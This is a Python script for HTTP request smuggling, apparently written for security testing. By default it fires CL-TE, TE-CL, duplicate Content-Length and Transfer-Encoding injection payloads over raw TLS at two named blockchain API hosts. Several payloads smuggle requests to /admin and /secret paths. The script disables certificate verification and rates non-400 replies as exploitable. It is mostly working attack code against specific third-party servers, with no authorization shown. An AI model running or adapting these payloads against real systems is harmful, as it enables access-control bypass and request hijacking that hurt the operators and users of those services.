#!/usr/bin/env python3
"""
HTTP Request Smuggling Fuzzer for Cloudflare-fronted Blockchain APIs
Adapted from MultiVAC e.mtv.ac + rpc.mtv.ac fuzz 2026-08-17.

Usage: python3 smuggling_fuzz.py <HOST1> [HOST2]
Default: e.mtv.ac rpc.mtv.ac

Tests: CL-TE, TE-CL, CL-CL, TE-header-injection against both targets.
Uses raw TLS sockets to bypass HTTP libraries' automatic header normalization.
"""
import socket
import ssl
import json
import sys
import time

TARGETS = [(sys.argv[1] if len(sys.argv) > 1 else "e.mtv.ac", 443)]
if len(sys.argv) > 2:
    TARGETS.append((sys.argv[2], 443))
elif len(sys.argv) <= 1:
    TARGETS.append(("rpc.mtv.ac", 443))

results = []
def log(test, target, technique, status, body, exploit):
    results.append({"test": test, "target": target, "technique": technique,
                    "status": str(status), "body": body[:500] if body else "", "exploitability": exploit})
    print(f"\n{'='*60}\nTEST: {test}\nTARGET: {target}\nTECH: {technique}\nSTATUS: {status}\nEXPLOIT: {exploit}\n{'='*60}")

def send_raw(host, port, raw, timeout=10):
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        ssock = ctx.wrap_socket(sock, server_hostname=host)
        ssock.connect((host, port))
        ssock.send(raw.encode())
        resp = b""
        try:
            while True:
                d = ssock.recv(4096)
                if not d: break
                resp += d
        except socket.timeout: pass
        ssock.close()
        r = resp.decode('utf-8', errors='replace')
        return (r.split('\r\n')[0] if r else "NO_RESPONSE"), r
    except Exception as e:
        return "ERROR", str(e)

# CL-TE payloads: Frontend uses Content-Length, Backend uses Transfer-Encoding
cl_te = [
    ("CL-TE basic",
     "POST / HTTP/1.1\r\nHost: {h}\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /40 HTTP/1.1\r\nHost: {h}\r\n\r\n",
     "HIGH - Classic CL-TE smuggling"),
    ("CL-TE obfuscated TE",
     "POST / HTTP/1.1\r\nHost: {h}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: {h}\r\n\r\n",
     "HIGH - TE obfuscation"),
    ("CL-TE TE space",
     "POST / HTTP/1.1\r\nHost: {h}\r\nContent-Length: 6\r\nTransfer-Encoding : chunked\r\n\r\n0\r\n\r\nGET /secret HTTP/1.1\r\nHost: {h}\r\n\r\n",
     "HIGH - space before colon - DIFFERENTIAL PARSING INDICATOR"),
    ("CL-TE TE tab",
     "POST / HTTP/1.1\r\nHost: {h}\r\nContent-Length: 6\r\nTransfer-Encoding:\tchunked\r\n\r\n0\r\n\r\nGET /test HTTP/1.1\r\nHost: {h}\r\n\r\n",
     "HIGH - tab before value - may reveal different origin behavior"),
    ("CL-TE double TE",
     "POST / HTTP/1.1\r\nHost: {h}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: cow\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: {h}\r\n\r\n",
     "HIGH - dual TE values"),
]

# TE-CL payloads: Frontend uses Transfer-Encoding, Backend uses Content-Length
te_cl = [
    ("TE-CL basic",
     "POST / HTTP/1.1\r\nHost: {h}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5e\r\nGET /admin HTTP/1.1\r\nHost: {h}\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n",
     "HIGH - Classic TE-CL smuggling"),
    ("TE-CL 0-chunk",
     "POST / HTTP/1.1\r\nHost: {h}\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n",
     "MEDIUM - explicit chunks"),
]

# Extra techniques
extra = [
    ("CL-CL double",
     "POST / HTTP/1.1\r\nHost: {h}\r\nContent-Length: 0\r\nContent-Length: 44\r\n\r\nGET /admin HTTP/1.1\r\nHost: {h}\r\nContent-Length: 0\r\n\r\n",
     "MEDIUM - dual Content-Length"),
    ("TE header injection",
     "POST / HTTP/1.1\r\nHost: {h}\r\nContent-Length: 100\r\nTransfer-Encoding: chunked\r\nX: \r\nTransfer-Encoding: cow\r\n\r\n0\r\n\r\n",
     "MEDIUM - TE wrapping via header injection"),
]

for host, port in TARGETS:
    print(f"\n### Testing {host} ###")
    for name, tpl, exploit in cl_te + te_cl + extra:
        status, body = send_raw(host, port, tpl.format(h=host))
        # Flag differential responses (not 400 = interesting)
        technique = "CL-TE" if name.startswith("CL-TE") else ("TE-CL" if name.startswith("TE-CL") else "EXTRA")
        if "400" not in status and "Bad Request" not in status:
            exploit = f"NOTABLE - non-400 response ({status}) may indicate parser differential"
        log(f"{name} on {host}", host, technique, status, body, exploit)
        time.sleep(1)

with open("smuggling_results.json", "w") as f:
    json.dump(results, f, indent=2)
print(f"\nTotal tests: {len(results)}\nResults: smuggling_results.json")
